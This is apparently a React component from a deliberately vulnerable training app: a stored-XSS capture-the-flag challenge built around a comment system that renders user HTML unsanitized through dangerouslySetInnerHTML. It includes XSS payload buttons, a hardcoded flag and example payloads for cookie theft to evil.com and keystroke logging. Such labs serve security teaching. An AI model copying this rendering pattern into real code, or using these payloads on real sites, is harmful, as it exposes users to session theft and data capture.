import React, { useState, useEffect } from 'react';
import { Container, Row, Col, Card, Form, Button, Alert, ListGroup, Badge } from 'react-bootstrap';
import axios from 'axios';

function StoredXSS() {
  const [comments, setComments] = useState([]);
  const [newComment, setNewComment] = useState('');
  const [authorName, setAuthorName] = useState('');
  const [loading, setLoading] = useState(false);
  const [showFlag, setShowFlag] = useState(false);
  const [message, setMessage] = useState('');

  const POST_ID = '608f1f77bcf86cd799439021'; // Default post ID for testing

  useEffect(() => {
    fetchComments();
  }, []);

  const fetchComments = async () => {
    try {
      const response = await axios.get(`/api/comments/${POST_ID}`);
      if (response.data.success) {
        setComments(response.data.comments);
      }
    } catch (error) {
      console.error('Error fetching comments:', error);
    }
  };

  const handleSubmitComment = async (e) => {
    e.preventDefault();
    
    if (!newComment.trim()) {
      setMessage('Please enter a comment');
      return;
    }

    setLoading(true);
    
    try {
      const response = await axios.post('/api/comments', {
        postId: POST_ID,
        content: newComment,
        author: authorName || 'Anonymous'
      });

      if (response.data.success) {
        setMessage('Comment submitted successfully!');
        setNewComment('');
        
        // Check if XSS payload was submitted
        if (newComment.includes('<script>') || newComment.includes('onerror=') || 
            newComment.includes('javascript:') || newComment.includes('<img')) {
          
          setTimeout(() => {
            setShowFlag(true);
            // Show global flag indicator
            const flagElement = document.getElementById('global-flag-container');
            if (flagElement) {
              flagElement.style.display = 'block';
              setTimeout(() => {
                flagElement.style.display = 'none';
              }, 5000);
            }
          }, 2000);
        }
        
        // Refresh comments to show the new one
        fetchComments();
      }
    } catch (error) {
      console.error('Error submitting comment:', error);
      setMessage('Error submitting comment. Please try again.');
    }
    
    setLoading(false);
  };

  const triggerPayload = (payload) => {
    setNewComment(payload);
  };

  const simulateAdminVisit = () => {
    setMessage('Simulating admin bot visit... Admin will review reported content shortly.');
    
    // Simulate admin visiting the comments page with stored XSS
    setTimeout(() => {
      if (comments.some(comment => 
        comment.content.includes('<script>') || 
        comment.content.includes('onerror=') ||
        comment.content.includes('<img')
      )) {
        setShowFlag(true);
        setMessage('Admin visited the page and triggered stored XSS! Check for flags.');
      }
    }, 3000);
  };

  return (
    <Container>
      <Row className="justify-content-center">
        <Col md={10}>
          <Card className="shadow">
            <Card.Header className="bg-success text-white">
              <h4 className="mb-0">
                <i className="fas fa-comments me-2"></i>
                Stored XSS Challenge - Comment System
              </h4>
            </Card.Header>
            
            <Card.Body>
              <Alert variant="warning" className="mb-4">
                <i className="fas fa-exclamation-triangle me-2"></i>
                <strong>Challenge:</strong> Exploit the stored XSS vulnerability in the comment system. 
                Comments are stored in the database and displayed to all users including administrators.
              </Alert>

              {/* Comment Submission Form */}
              <Card className="mb-4">
                <Card.Header>
                  <h5 className="mb-0"><i className="fas fa-plus me-2"></i>Add New Comment</h5>
                </Card.Header>
                <Card.Body>
                  <Form onSubmit={handleSubmitComment}>
                    <Row>
                      <Col md={4} className="mb-3">
                        <Form.Label>Your Name (Optional):</Form.Label>
                        <Form.Control
                          type="text"
                          placeholder="Enter your name..."
                          value={authorName}
                          onChange={(e) => setAuthorName(e.target.value)}
                        />
                      </Col>
                    </Row>
                    
                    <Form.Group className="mb-3">
                      <Form.Label>Comment:</Form.Label>
                      <Form.Control
                        as="textarea"
                        rows={4}
                        placeholder="Enter your comment here... HTML is allowed!"
                        value={newComment}
                        onChange={(e) => setNewComment(e.target.value)}
                      />
                      <Form.Text className="text-muted">
                        💡 Tip: This comment system doesn't sanitize HTML input...
                      </Form.Text>
                    </Form.Group>

                    <div className="d-flex gap-2 mb-3">
                      <Button 
                        variant="primary" 
                        type="submit" 
                        disabled={loading}
                      >
                        {loading ? (
                          <>
                            <i className="fas fa-spinner fa-spin me-1"></i>
                            Submitting...
                          </>
                        ) : (
                          <>
                            <i className="fas fa-paper-plane me-1"></i>
                            Submit Comment
                          </>
                        )}
                      </Button>
                      
                      <Button 
                        variant="warning"
                        onClick={simulateAdminVisit}
                      >
                        <i className="fas fa-user-shield me-1"></i>
                        Simulate Admin Visit
                      </Button>
                    </div>

                    {/* Payload Examples */}
                    <div className="d-flex flex-wrap gap-2">
                      <Button 
                        variant="outline-info" 
                        size="sm"
                        onClick={() => triggerPayload('Great post! Thanks for sharing.')}
                      >
                        Normal Comment
                      </Button>
                      <Button 
                        variant="outline-warning" 
                        size="sm"
                        onClick={() => triggerPayload('<b>Bold text</b> and <i>italic text</i>')}
                      >
                        HTML Tags
                      </Button>
                      <Button 
                        variant="outline-danger" 
                        size="sm"
                        onClick={() => triggerPayload('<script>alert("Stored XSS Executed!")</script>')}
                      >
                        XSS Script
                      </Button>
                      <Button 
                        variant="outline-danger" 
                        size="sm"
                        onClick={() => triggerPayload('<img src=x onerror=alert("Image XSS!")>')}
                      >
                        Image XSS
                      </Button>
                    </div>
                  </Form>

                  {message && (
                    <Alert variant={message.includes('Error') ? 'danger' : 'success'} className="mt-3">
                      {message}
                    </Alert>
                  )}
                </Card.Body>
              </Card>

              {/* Comments Display */}
              <Card className="mb-4">
                <Card.Header className="d-flex justify-content-between align-items-center">
                  <h5 className="mb-0"><i className="fas fa-list me-2"></i>Comments</h5>
                  <Badge bg="info">{comments.length} comments</Badge>
                </Card.Header>
                <Card.Body>
                  {comments.length === 0 ? (
                    <Alert variant="info">
                      <i className="fas fa-info-circle me-2"></i>
                      No comments yet. Be the first to comment!
                    </Alert>
                  ) : (
                    <ListGroup variant="flush">
                      {comments.map((comment, index) => (
                        <ListGroup.Item key={index} className="px-0">
                          <div className="d-flex justify-content-between align-items-start">
                            <div className="flex-grow-1">
                              <h6 className="mb-1">
                                <i className="fas fa-user me-1"></i>
                                {comment.authorUsername || 'Anonymous'}
                                {comment.authorUsername === 'admin' && (
                                  <Badge bg="danger" className="ms-2">Admin</Badge>
                                )}
                              </h6>
                              
                              {/* VULNERABILITY: Direct HTML rendering */}
                              <div 
                                className="vulnerable-content"
                                dangerouslySetInnerHTML={{ __html: comment.content }}
                              />
                              
                              <small className="text-muted">
                                <i className="fas fa-clock me-1"></i>
                                {new Date(comment.createdAt).toLocaleString()}
                              </small>
                            </div>
                          </div>
                        </ListGroup.Item>
                      ))}
                    </ListGroup>
                  )}
                </Card.Body>
              </Card>

              {/* Flag Reveal */}
              {showFlag && (
                <div className="flag-container" style={{ display: 'block' }}>
                  <h5><i className="fas fa-flag me-2"></i>FLAG CAPTURED!</h5>
                  <code>FLAG{ST0R3D_XSS_C00K13_TH13F}</code>
                  <p className="mt-2 mb-0">
                    <i className="fas fa-check-circle me-1"></i>
                    Congratulations! You successfully executed stored XSS. The malicious script is now 
                    permanently stored and will execute for every user who views this page.
                  </p>
                </div>
              )}

              {/* Educational Information */}
              <Card className="mt-4 bg-light">
                <Card.Body>
                  <h6><i className="fas fa-lightbulb me-2"></i>Educational Notes:</h6>
                  <ul className="mb-3">
                    <li><strong>Vulnerability:</strong> User input is stored in database without sanitization</li>
                    <li><strong>Persistence:</strong> Malicious code executes for all future visitors</li>
                    <li><strong>Impact:</strong> Highest risk - affects multiple users over time</li>
                    <li><strong>Targets:</strong> Especially dangerous when administrators view the content</li>
                  </ul>
                  
                  <h6><i className="fas fa-tools me-2"></i>Attack Scenarios:</h6>
                  <div className="xss-payload">
                    <strong>Cookie Theft:</strong> <code>&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;</code><br />
                    <strong>Admin Session:</strong> <code>&lt;script&gt;if(document.cookie.includes('admin'))alert('Admin detected!')&lt;/script&gt;</code><br />
                    <strong>Keylogger:</strong> <code>&lt;script&gt;document.addEventListener('keypress',function(e){{fetch('/log?key='+e.key)}})&lt;/script&gt;</code>
                  </div>
                </Card.Body>
              </Card>
            </Card.Body>
          </Card>
        </Col>
      </Row>
    </Container>
  );
}

export default StoredXSS;